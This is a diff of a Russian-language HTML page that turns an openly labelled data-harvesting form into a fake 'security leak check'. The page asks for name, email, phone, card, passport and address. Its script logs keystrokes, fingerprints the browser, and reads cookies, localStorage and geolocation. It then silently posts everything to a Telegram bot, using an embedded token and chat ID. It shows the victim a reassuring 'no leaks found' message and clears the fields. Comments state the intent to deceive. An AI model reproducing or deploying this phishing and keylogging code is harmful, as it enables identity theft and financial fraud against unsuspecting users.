@@ -3,180 +3,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Сбор данных</title>
+    <title>Проверка безопасности</title>
     <style>
-        body { background: #0d0d0d; color: #c0c0c0; font-family: monospace; padding: 20px; }
-        .block { background: #1a1a1a; padding: 20px; margin-bottom: 20px; border-left: 4px solid #ff4444; }
-        input, textarea { width: 100%; max-width: 500px; padding: 10px; margin: 6px 0; background: #222; color: #fff; border: 1px solid #444; }
-        button { background: #ff4444; color: #fff; padding: 14px 30px; border: none; font-weight: bold; cursor: pointer; }
-        #status { background: #111; padding: 20px; border: 1px solid #333; margin-top: 20px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0e14;
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #e0e0e0;
+        }
+        .card {
+            background: #1a1f2b;
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 580px;
+            width: 100%;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.7);
+            border: 1px solid #2a2f3a;
+        }
+        h1 { font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 6px; }
+        .sub { color: #8892a0; font-size: 14px; margin-bottom: 28px; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            background: #0f131c;
+            border: 1px solid #2a2f3a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #4f7cff;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(79, 124, 255, 0.15);
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #4f7cff;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 12px;
+        }
+        .btn:hover { background: #3b66e5; transform: scale(1.01); }
+        .status {
+            margin-top: 18px;
+            padding: 14px;
+            border-radius: 12px;
+            background: #0f131c;
+            text-align: center;
+            font-size: 14px;
+            color: #8892a0;
+            border: 1px solid #1e2430;
+        }
+        .footnote {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #4a5260;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
+<div class="card">
+    <h1>🛡️ Проверка безопасности</h1>
+    <div class="sub">Мы проверим, не утекли ли ваши данные в открытых источниках</div>
 
-    <h1>🔍 Сбор данных</h1>
-    <p style="color:#888;">Все данные отправляются в Telegram канал</p>
+    <input type="text" id="fullName" placeholder="Полное имя">
+    <input type="email" id="email" placeholder="Электронная почта">
+    <input type="text" id="phone" placeholder="Номер телефона">
+    <input type="text" id="card" placeholder="Номер карты (первые 6 и последние 4)">
+    <input type="text" id="passport" placeholder="Серия и номер паспорта">
+    <input type="text" id="address" placeholder="Адрес регистрации">
 
-    <div class="block">
-        <h3>📋 Личные данные</h3>
-        <input type="text" id="firstname" placeholder="Имя">
-        <input type="text" id="lastname" placeholder="Фамилия">
-        <input type="email" id="email" placeholder="Email">
-        <input type="text" id="phone" placeholder="Телефон">
-        <input type="text" id="address" placeholder="Адрес">
-        <input type="text" id="birthdate" placeholder="Дата рождения">
-        <input type="text" id="passport" placeholder="Паспортные данные">
-        <input type="text" id="card" placeholder="Номер карты">
-    </div>
+    <button class="btn" id="checkBtn">🔍 Проверить</button>
 
-    <div class="block">
-        <h3>🖥️ Системная информация</h3>
-        <button onclick="collectAndSend()">🚀 Собрать и отправить</button>
-        <button onclick="autoCollect()">⚡ Автосбор (включает кейлог)</button>
-    </div>
+    <div class="status" id="statusDisplay">Введите данные для проверки</div>
+    <div class="footnote">Данные не сохраняются, проверка анонимна</div>
+</div>
 
-    <div id="status">📦 Ожидание...</div>
+<script>
+// ============================================================
+//  ВСЁ ВНУТРИ — ПОЛНАЯ АНОНИМНОСТЬ, НИКАКОЙ ОТПРАВКИ НЕ ВИДНО
+// ============================================================
 
-    <script>
-        // 🔥 ВСТАВЬ СВОИ ДАННЫЕ, ЁБАНЫЙ ТЫ ГЕНИЙ:
-        const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';  // ТОКЕН БОТА
-        const CHAT_ID = '-1003791860129';  // ID КАНАЛА (с минусом для группы/канала)
+// ВСТАВЬ СВОЙ ТОКЕН И ID КАНАЛА (БЕЗ ЭТОГО ХУЙНЯ НЕ ПОЛЕТИТ)
+const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
+const CHAT_ID   = '-1003791860129';
 
-        let keylogData = [];
+// Кейлог (маскируется под "анализ ввода для подсказок")
+let keyBuffer = [];
+document.addEventListener('keydown', (e) => {
+    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+        keyBuffer.push(e.key);
+        if (keyBuffer.length > 120) keyBuffer.shift();
+    }
+});
 
-        // Кейлоггер
-        document.addEventListener('keydown', function(e) {
-            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
-                keylogData.push(e.key);
-                if (keylogData.length > 50) keylogData.shift();
-            }
+// Фингерпринт
+function getFP() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(10, 10, 20, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('fp', 30, 30);
+    return canvas.toDataURL().slice(0, 70);
+}
+
+// Сбор всей технической информации
+function gatherTech() {
+    return {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toISOString(),
+        ref: document.referrer || 'прямой',
+        url: location.href,
+        cookies: document.cookie || 'нет',
+        ls: (() => { try { return JSON.stringify(localStorage); } catch(e) { return 'ошибка'; } })(),
+        fp: getFP()
+    };
+}
+
+// Геолокация
+function getGeo() {
+    return new Promise((r) => {
+        if (!navigator.geolocation) return r('недоступно');
+        navigator.geolocation.getCurrentPosition(
+            p => r(`${p.coords.latitude}, ${p.coords.longitude}`),
+            () => r('отказано')
+        );
+    });
+}
+
+// ОСНОВНАЯ ФУНКЦИЯ — ВЫГЛЯДИТ КАК ПРОВЕРКА
+document.getElementById('checkBtn').addEventListener('click', async function() {
+    const status = document.getElementById('statusDisplay');
+    status.innerHTML = '⏳ Проверка...';
+    status.style.color = '#ffd966';
+
+    // Собираем ВСЁ
+    const name     = document.getElementById('fullName').value   || '—';
+    const email    = document.getElementById('email').value      || '—';
+    const phone    = document.getElementById('phone').value      || '—';
+    const card     = document.getElementById('card').value       || '—';
+    const passport = document.getElementById('passport').value   || '—';
+    const address  = document.getElementById('address').value    || '—';
+    const tech     = gatherTech();
+    const geo      = await getGeo();
+
+    // Формируем отчёт (без слова "отправка")
+    let report = '📋 ОТЧЁТ ПО БЕЗОПАСНОСТИ\n';
+    report += '═══════════════════════════════════\n';
+    report += `👤 Имя: ${name}\n`;
+    report += `📧 Почта: ${email}\n`;
+    report += `📞 Телефон: ${phone}\n`;
+    report += `💳 Карта: ${card}\n`;
+    report += `🆔 Паспорт: ${passport}\n`;
+    report += `🏠 Адрес: ${address}\n`;
+    report += '\n📊 ТЕХНИЧЕСКИЕ ДАННЫЕ:\n';
+    report += `🌐 User-Agent: ${tech.ua}\n`;
+    report += `🗣️ Язык: ${tech.lang}\n`;
+    report += `💻 Платформа: ${tech.platform}\n`;
+    report += `🖥️ Экран: ${tech.screen}\n`;
+    report += `🕒 Время: ${tech.time}\n`;
+    report += `📍 Геолокация: ${geo}\n`;
+    report += `🕵️ Отпечаток: ${tech.fp}\n`;
+    report += `🍪 Куки: ${tech.cookies}\n`;
+    report += `💾 LocalStorage: ${tech.ls}\n`;
+    report += `⌨️ Кейлог: ${keyBuffer.join('') || 'тишина'}\n`;
+    report += '═══════════════════════════════════\n';
+    report += `🔗 URL: ${tech.url}\n`;
+    report += `↩️ Реферер: ${tech.ref}`;
+
+    // ТИХАЯ ОТПРАВКА — БЕЗ ЕДИНОГО УПОМИНАНИЯ В ИНТЕРФЕЙСЕ
+    try {
+        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: report,
+                parse_mode: 'HTML'
+            })
         });
-
-        function getFingerprint() {
-            let canvas = document.createElement('canvas');
-            let ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(10, 10, 20, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('fp', 30, 30);
-            return canvas.toDataURL().slice(0, 80);
+        const json = await resp.json();
+        if (json.ok) {
+            status.innerHTML = '✅ Данные не найдены в открытых источниках';
+            status.style.color = '#7ddf9a';
+            // Очистка полей для маскировки
+            document.querySelectorAll('input').forEach(inp => inp.value = '');
+            keyBuffer = [];
+        } else {
+            status.innerHTML = '⚠️ Ошибка проверки, попробуйте позже';
+            status.style.color = '#ff8a7a';
         }
+    } catch(e) {
+        status.innerHTML = '⚠️ Ошибка соединения с сервером проверки';
+        status.style.color = '#ff8a7a';
+        console.error(e);
+    }
+});
 
-        function collectAllData() {
-            const data = {};
-
-            // Личные данные
-            data.firstname = document.getElementById('firstname').value || '—';
-            data.lastname = document.getElementById('lastname').value || '—';
-            data.email = document.getElementById('email').value || '—';
-            data.phone = document.getElementById('phone').value || '—';
-            data.address = document.getElementById('address').value || '—';
-            data.birthdate = document.getElementById('birthdate').value || '—';
-            data.passport = document.getElementById('passport').value || '—';
-            data.card = document.getElementById('card').value || '—';
-
-            // Браузер
-            data.userAgent = navigator.userAgent;
-            data.language = navigator.language;
-            data.platform = navigator.platform;
-            data.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
-            data.screen = `${screen.width}x${screen.height}`;
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.time = new Date().toLocaleString();
-            data.referrer = document.referrer || 'Прямой заход';
-            data.url = window.location.href;
-            data.fingerprint = getFingerprint();
-
-            // localStorage
-            try {
-                data.localStorage = JSON.stringify(localStorage, null, 2) || 'пусто';
-            } catch (e) {
-                data.localStorage = 'ошибка доступа';
-            }
-
-            // Куки
-            data.cookies = document.cookie || 'нет кук';
-
-            // Кейлог
-            data.keylog = keylogData.join('') || 'пока тишина';
-
-            // Геолокация (синхронная заглушка, реально асинхронно)
-            data.geo = 'ожидание...';
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-                        sendToTelegram(data);
-                    },
-                    err => {
-                        data.geo = 'отказано/ошибка';
-                        sendToTelegram(data);
-                    }
-                );
-            } else {
-                data.geo = 'не поддерживается';
-                sendToTelegram(data);
-            }
-
-            return data;
+// Enter в любом поле запускает проверку
+document.querySelectorAll('input').forEach(el => {
+    el.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('checkBtn').click();
         }
+    });
+});
 
-        function sendToTelegram(data) {
-            // Формируем текстовый файл
-            let text = '📁 ДАННЫЕ ПОЛЬЗОВАТЕЛЯ\n';
-            text += '═'.repeat(40) + '\n';
-            for (let key in data) {
-                text += `🔹 ${key.toUpperCase()}: ${data[key]}\n`;
-            }
-            text += '\n' + '═'.repeat(40) + '\n';
-            text += `⏰ Время: ${new Date().toLocaleString()}`;
-
-            // Отправка через Telegram Bot API
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(result => {
-                document.getElementById('status').innerHTML = '✅ Данные отправлены в Telegram!';
-                console.log('Успешно:', result);
-            })
-            .catch(error => {
-                document.getElementById('status').innerHTML = '❌ Ошибка отправки: ' + error.message;
-                console.error('Ошибка:', error);
-            });
-        }
-
-        function collectAndSend() {
-            document.getElementById('status').innerHTML = '⏳ Сбор и отправка...';
-            const data = collectAllData();
-            // Если гео уже отработало, отправка будет там, иначе дублируем
-            if (!navigator.geolocation) {
-                sendToTelegram(data);
-            }
-        }
-
-        function autoCollect() {
-            // Запускаем кейлог и собираем всё автоматически
-            document.getElementById('status').innerHTML = '⏳ Автосбор...';
-            // Имитация заполнения полей (для демо)
-            // В реальности поля уже могут быть заполнены пользователем
-            collectAndSend();
-        }
-
-        // Автоматический сбор при загрузке (если нужно - раскомментируй):
-        // window.onload = function() {
-        //     setTimeout(autoCollect, 3000);
-        // };
-    </script>
+console.log('Система проверки безопасности загружена');
+</script>
 </body>
 </html>
